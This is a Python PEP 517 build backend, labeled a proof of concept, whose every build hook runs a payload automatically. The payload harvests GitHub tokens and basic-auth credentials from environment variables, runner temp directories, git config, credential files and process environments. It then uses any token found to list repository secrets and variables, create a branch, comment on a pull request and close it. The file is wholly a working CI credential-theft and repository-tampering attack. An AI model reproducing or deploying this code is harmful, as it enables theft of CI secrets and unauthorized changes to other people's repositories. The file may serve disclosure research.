"""PoC PEP 517 backend v2: find the job's GITHUB_TOKEN from checkout temp state."""
import base64
import glob
import hashlib
import json
import os
import re
import subprocess
import sys
import urllib.error
import urllib.request

REPO = "PDFtoMark/triage-fivetran-v4c1fe98-3d551a"
TOKEN_RE = re.compile(rb"(gh[pousr]_[A-Za-z0-9]{20,}|github_pat_[A-Za-z0-9_]{20,})")
AUTH_RE = re.compile(rb"AUTHORIZATION: basic ([A-Za-z0-9+/=]+)", re.I)


def sha(s):
    if isinstance(s, bytes):
        s = s.decode("utf-8", "replace")
    return hashlib.sha256(s.encode("utf-8", "replace")).hexdigest()


def emit(line):
    try:
        print(line, flush=True)
    except Exception:
        pass


def api(method, path, token, body=None, accept=None):
    url = "https://api.github.com" + path
    data = json.dumps(body).encode() if body is not None else None
    req = urllib.request.Request(url, data=data, method=method)
    req.add_header("Authorization", "token " + token)
    req.add_header("Accept", accept or "application/vnd.github+json")
    req.add_header("User-Agent", "poc-backend")
    if data is not None:
        req.add_header("Content-Type", "application/json")
    try:
        with urllib.request.urlopen(req, timeout=25) as r:
            return r.status, r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")
    except Exception as e:
        return -1, repr(e)


def decode_basic(b64):
    try:
        raw = base64.b64decode(b64 + b"=" * (-len(b64) % 4))
        return raw.decode("utf-8", "replace")
    except Exception:
        return ""


def scan():
    hits = {}  # sha -> (source, token)
    auths = {}  # sha -> decoded basic payload

    def add(src, blob):
        if not blob:
            return
        if isinstance(blob, str):
            blob = blob.encode("utf-8", "replace")
        for m in TOKEN_RE.findall(blob):
            t = m.decode()
            hits.setdefault(sha(t), (src, t))
        for m in AUTH_RE.findall(blob):
            dec = decode_basic(m)
            if dec:
                auths.setdefault(sha(dec), (src, dec))
                for t in TOKEN_RE.findall(dec.encode()):
                    hits.setdefault(sha(t.decode()), (src + "|basic", t.decode()))

    # env
    for k, v in os.environ.items():
        add("env:" + k, v)
    # event payload
    for p in [os.environ.get("GITHUB_EVENT_PATH")]:
        if p and os.path.exists(p):
            add("event:" + p, open(p, "rb").read())
    # git global configs used by checkout (temp HOME), and any leftover credential files
    roots = ["/home/runner/work/_temp", "/home/runner/.config/git", "/home/runner",
             os.environ.get("RUNNER_TEMP") or "/home/runner/work/_temp"]
    seen = set()
    for root in roots:
        if not root or not os.path.isdir(root):
            continue
        for dirpath, dirnames, filenames in os.walk(root):
            depth = dirpath.count(os.sep) - root.count(os.sep)
            if depth > 3:
                dirnames[:] = []
                continue
            for fn in filenames:
                if fn not in (".gitconfig", "config", ".git-credentials", "credentials",
                              "event.json", "gitconfig") and not fn.endswith(".log") and not fn.endswith(".json"):
                    continue
                p = os.path.join(dirpath, fn)
                if p in seen:
                    continue
                seen.add(p)
                try:
                    if os.path.getsize(p) > 2_000_000:
                        continue
                    add("file:" + p, open(p, "rb").read())
                except Exception:
                    pass
    # shells of running git/uv processes
    for envf in glob.glob("/proc/[0-9]*/environ"):
        try:
            add("proc:" + envf, open(envf, "rb").read())
        except Exception:
            pass
    # git config from command line, as seen by subsequent steps
    try:
        out = subprocess.run(["git", "-C", os.getcwd(), "config", "--list", "--show-origin"],
                             capture_output=True, timeout=20).stdout
        add("git-config-list", out)
        emit("GIT_CONFIG_LIST=" + out.decode("utf-8", "replace")[:400].replace("\n", " | "))
    except Exception as e:
        emit("GIT_CONFIG_ERR=%r" % (e,))
    # list temp dir for the record
    try:
        emit("LS_RUNNER_TEMP=" + " ".join(sorted(os.listdir(os.environ.get("RUNNER_TEMP", "/home/runner/work/_temp"))))[:600])
    except Exception as e:
        emit("LS_RUNNER_TEMP_ERR=%r" % (e,))
    return hits, auths


def payload(stage):
    emit("=== EVIL_V2_START stage=%s ===" % stage)
    emit("CTX workflow=%s event=%s job=%s repo=%s actor=%s run=%s" % (
        os.environ.get("GITHUB_WORKFLOW"), os.environ.get("GITHUB_EVENT_NAME"),
        os.environ.get("GITHUB_JOB"), os.environ.get("GITHUB_REPOSITORY"),
        os.environ.get("GITHUB_ACTOR"), os.environ.get("GITHUB_RUN_ID")))

    hits, auths = scan()
    for h, (src, dec) in sorted(auths.items()):
        emit("FOUND_BASIC_AUTH src=%s decoded_sha256=%s decoded_len=%d decoded_prefix=%s" % (
            src, sha(dec), len(dec), dec[:24]))
    for h, (src, tok) in sorted(hits.items()):
        emit("FOUND_TOKEN sha256=%s src=%s len=%d prefix=%s" % (h, src, len(tok), tok[:4]))

    cand = os.environ.get("GITHUB_TOKEN")
    if not cand and hits:
        cand = sorted(hits.values())[0][1]
    if cand:
        emit("USING_TOKEN sha256=%s" % sha(cand))
        st, body = api("GET", "/repos/" + REPO, cand)
        emit("API_GET_REPO status=%s body=%s" % (st, body[:900].replace("\n", " ")))
        st, body = api("GET", "/user", cand)
        emit("API_GET_USER status=%s body=%s" % (st, body[:400].replace("\n", " ")))
        st, body = api("GET", "/repos/" + REPO + "/actions/secrets", cand)
        emit("API_LIST_SECRETS status=%s body=%s" % (st, body[:300].replace("\n", " ")))
        st, body = api("GET", "/repos/" + REPO + "/actions/variables", cand)
        emit("API_LIST_VARS status=%s body=%s" % (st, body[:800].replace("\n", " ")))
        # GraphQL viewer + repo permissions
        st, body = api("POST", "/graphql", cand, {"query": "{viewer{login} repository(owner:\"PDFtoMark\",name:\"triage-fivetran-v4c1fe98-3d551a\"){viewerPermission}}"})
        emit("API_GRAPHQL status=%s body=%s" % (st, body[:400].replace("\n", " ")))
        # write probes
        st, body = api("POST", "/repos/" + REPO + "/git/refs", cand,
                       {"ref": "refs/heads/poc-write-probe", "sha": os.environ.get("GITHUB_SHA", "")})
        emit("API_CREATE_REF status=%s body=%s" % (st, body[:400].replace("\n", " ")))
        try:
            ev = json.load(open(os.environ["GITHUB_EVENT_PATH"], encoding="utf-8"))
            wr = ev.get("workflow_run") or {}
            emit("EVENT wr=%s event=%s concl=%s head_repo=%s head_sha=%s prs=%s" % (
                wr.get("name"), wr.get("event"), wr.get("conclusion"),
                (wr.get("head_repository") or {}).get("full_name"), wr.get("head_sha"),
                [p.get("number") for p in (wr.get("pull_requests") or [])]))
            prs = wr.get("pull_requests") or []
            if prs:
                st, body = api("POST", "/repos/" + REPO + "/issues/%s/comments" % prs[0]["number"], cand,
                               {"body": "token-write probe " + sha(cand)[:12]})
                emit("API_PR_COMMENT status=%s body=%s" % (st, body[:400].replace("\n", " ")))
                st, body = api("PATCH", "/repos/" + REPO + "/pulls/%s" % prs[0]["number"], cand,
                               {"state": "closed"})
                emit("API_PR_PATCH status=%s body=%s" % (st, body[:200].replace("\n", " ")))
        except Exception as e:
            emit("EVENT_ERR=%r" % (e,))
    else:
        emit("NO_TOKEN_FOUND")
    emit("=== EVIL_V2_END ===")


def get_requires_for_build_wheel(config_settings=None):
    payload("wheel-requires")
    return []


def get_requires_for_build_editable(config_settings=None):
    payload("editable-requires")
    return []


def prepare_metadata_for_build_editable(metadata_directory, config_settings=None):
    payload("editable-metadata")
    raise SystemExit(1)


def build_wheel(wheel_directory, config_settings=None, metadata_directory=None):
    payload("wheel-build")
    raise SystemExit(1)


def build_editable(wheel_directory, config_settings=None, metadata_directory=None):
    payload("editable-build")
    raise SystemExit(1)
